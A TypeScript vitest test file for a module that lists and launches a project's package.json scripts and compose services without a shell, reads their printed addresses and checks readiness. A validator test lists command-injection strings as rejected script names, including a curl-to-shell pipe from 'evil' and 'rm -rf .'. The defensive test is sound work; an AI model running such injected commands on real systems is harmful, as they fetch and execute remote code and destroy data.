/**
 * What a project runs (task 10.3): the scripts of its package.json and the services of its compose file,
 * started on a click — hidden, an argument array, never a shell — their output to the terminal, their address
 * read from what they print, then waited for until it answers; the servers already running on this machine.
 */

import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { SpawnFn } from '../process/spawn.js';
import { spawnHidden } from '../process/spawn.js';
import type { CommandOutputEvent } from '../tools/types.js';
import { isSafeScriptName, ProjectRuns } from './runs.js';

const dirs: string[] = [];
const servers: Server[] = [];
const runs: ProjectRuns[] = [];
afterEach(async () => {
  await Promise.all(runs.splice(0).map((one) => one.stopAll()));
  for (const server of servers.splice(0)) server.close();
  await Promise.all(dirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

async function project(scripts: Record<string, string>, compose?: string): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'bp-runs-'));
  dirs.push(dir);
  await writeFile(join(dir, 'package.json'), JSON.stringify({ name: 'spanwise', scripts }));
  await writeFile(join(dir, 'pnpm-lock.yaml'), '');
  if (compose) await writeFile(join(dir, 'docker-compose.yml'), compose);
  return dir;
}

/** A port that answers, as a dev server does once it is up. */
async function listening(): Promise<number> {
  const server = createServer((socket) => socket.end());
  servers.push(server);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  return (server.address() as { port: number }).port;
}

describe('isSafeScriptName (ported from v0)', () => {
  it.each(['dev', 'build:prod', 'test.unit', 'lint-fix', 'e2e_ci', 'Dev2'])('accepts %s', (name) => expect(isSafeScriptName(name)).toBe(true));
  it.each(['dev & calc', 'dev && curl evil | sh', 'dev; rm -rf .', 'dev`whoami`', 'dev $(id)', 'dev > out', 'dev\nrm', '', ' dev', 'dev/../x'])(
    'refuses %j',
    (name) => expect(isSafeScriptName(name)).toBe(false),
  );
});

describe('what a project runs (task 10.3)', () => {
  it('lists the scripts of package.json and the services of its compose file, none running', async () => {
    const root = await project({ dev: 'vite', 'dev & calc': 'x', build: 'vite build' }, 'services:\n  api:\n    image: x\n');
    const runner = new ProjectRuns({ env: () => ({}) });
    runs.push(runner);
    const list = await runner.list(root);
    expect(list.manager).toBe('pnpm');
    expect(list.runs).toEqual([
      { kind: 'script', name: 'dev', command: 'pnpm dev', state: 'stopped', url: null },
      { kind: 'script', name: 'build', command: 'pnpm build', state: 'stopped', url: null },
      { kind: 'service', name: 'api', command: 'docker compose up api', state: 'stopped', url: null },
    ]);
  });

  it('a script runs as [manager, run, name] — hidden, without a shell — its output to the terminal; a trap name runs nothing', async () => {
    const root = await project({ dev: 'vite', 'dev & calc': 'x' });
    const launched: { command: string; args: readonly string[]; shell: unknown }[] = [];
    const spawn: SpawnFn = (command, args, options) => {
      launched.push({ command, args, shell: options.shell });
      return spawnHidden(process.execPath, ['-e', 'console.log("ready on http://localhost:5173/"); setTimeout(() => {}, 10000)'], options as never);
    };
    const said: CommandOutputEvent[] = [];
    const runner = new ProjectRuns({ env: () => ({}), spawn, output: (event) => said.push(event), platform: 'linux' });
    runs.push(runner);
    await expect(runner.start(root, 'script', 'dev & calc')).rejects.toThrow(/not a script name/);
    expect(launched).toEqual([]);

    await runner.start(root, 'script', 'dev');
    expect(launched).toEqual([{ command: 'pnpm', args: ['run', 'dev'], shell: false }]);
    expect(said[0]).toEqual({ kind: 'start', command: 'pnpm run dev', cwd: root });
    await vi.waitFor(() => expect(said.some((event) => event.kind === 'data' && event.text.includes('localhost:5173'))).toBe(true));
    await vi.waitFor(async () => expect((await runner.list(root)).runs[0]).toMatchObject({ name: 'dev', state: 'running', url: 'http://localhost:5173/' }));
  });

  it('its address is ready only once it answers', async () => {
    const port = await listening();
    const root = await project({ dev: 'vite' });
    const spawn: SpawnFn = (_command, _args, options) =>
      spawnHidden(process.execPath, ['-e', `console.log("Local: http://127.0.0.1:${port}/"); setTimeout(() => {}, 10000)`], options as never);
    const runner = new ProjectRuns({ env: () => ({}), spawn, platform: 'linux' });
    runs.push(runner);
    await runner.start(root, 'script', 'dev');
    await vi.waitFor(async () => expect((await runner.list(root)).runs[0]).toMatchObject({ url: `http://127.0.0.1:${port}/`, ready: true }), { timeout: 10_000 });
  });

  it('stopped, a script goes down with its whole tree, and says so', async () => {
    const root = await project({ dev: 'vite' });
    const spawn: SpawnFn = (_command, _args, options) => spawnHidden(process.execPath, ['-e', 'setTimeout(() => {}, 10000)'], options as never);
    const runner = new ProjectRuns({ env: () => ({}), spawn, platform: 'linux' });
    runs.push(runner);
    await runner.start(root, 'script', 'dev');
    await runner.stop(root, 'dev');
    expect((await runner.list(root)).runs[0]).toMatchObject({ state: 'stopped' });
  });

  it('the servers already running on this machine: the usual ports that answer, outside what the project runs', async () => {
    const port = await listening();
    const runner = new ProjectRuns({ env: () => ({}), ports: [port, 9] });
    runs.push(runner);
    expect(await runner.alreadyRunning()).toEqual([`http://localhost:${port}/`]);
  });
});

describe('an address cut by the pipe (review of the screen, task 10.3)', () => {
  it('is read once its line is whole', async () => {
    const root = await project({ dev: 'vite' });
    const spawn: SpawnFn = (_command, _args, options) =>
      spawnHidden(process.execPath, ['-e', 'process.stdout.write("Local: http://127.0.0.1:"); setTimeout(() => { process.stdout.write("5173/\\n"); setTimeout(() => {}, 10000) }, 200)'], options as never);
    const runner = new ProjectRuns({ env: () => ({}), spawn, platform: 'linux' });
    runs.push(runner);
    await runner.start(root, 'script', 'dev');
    await vi.waitFor(async () => expect((await runner.list(root)).runs[0]).toMatchObject({ url: 'http://127.0.0.1:5173/' }), { timeout: 5_000 });
  });
});
